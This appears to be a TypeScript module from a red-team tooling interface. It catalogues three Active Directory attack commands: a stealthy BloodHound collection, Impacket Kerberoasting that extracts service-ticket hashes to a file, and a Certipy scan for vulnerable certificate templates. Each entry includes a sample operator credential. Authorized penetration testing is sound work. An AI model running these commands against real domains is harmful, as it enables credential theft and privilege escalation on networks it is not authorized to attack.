import { ToolModule } from './offensiveTools'

export const AD_TOOLS: ToolModule[] = [
  {
    id: 'bloodhound-ce-deep',
    name: 'BloodHound Enterprise Graph Collector',
    description: 'Cartographie complète des objets AD, des ACLs, des GPO et des chemins d’escalade de privilèges en mode furtif.',
    category: 'Active Directory',
    commandTemplate: 'bloodhound-python -u "operator_svc" -p "ComplexPass!2026" -d corp.local -dc {target} --collectionmethods All --dns-tcp',
    defaultCommand: 'bloodhound-python -d corp.local -dc <target> --collectionmethods All',
    riskLevel: 'HIGH',
    mitreTechnique: 'T1087.002 (Account Discovery: Domain Account)'
  },
  {
    id: 'impacket-kerberoast',
    name: 'Impacket Advanced Kerberoasting Suite',
    description: 'Extraction automatisée des tickets TGS-REP pour les comptes de service configurés avec des SPN faibles.',
    category: 'Active Directory',
    commandTemplate: 'GetUserSPNs.py corp.local/operator_svc:ComplexPass!2026 -dc-ip {target} -request -outputfile domain_spn_hashes.txt',
    defaultCommand: 'GetUserSPNs.py corp.local/operator:Pass -dc-ip <target> -request',
    riskLevel: 'CRITICAL',
    mitreTechnique: 'T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)'
  },
  {
    id: 'certipy-esc',
    name: 'Certipy AD CS Vulnerability Hunter',
    description: 'Recherche et exploitation des configurations vulnérables des services de certificats Active Directory (ESC1 à ESC8).',
    category: 'Active Directory',
    commandTemplate: 'certipy find -u "operator_svc@corp.local" -p "ComplexPass!2026" -dc-ip {target} -vulnerable -stdout',
    defaultCommand: 'certipy find -u user -p pass -dc-ip <target> -vulnerable',
    riskLevel: 'CRITICAL',
    mitreTechnique: 'T1649 (Steal or Forge Authentication Certificates)'
  }
]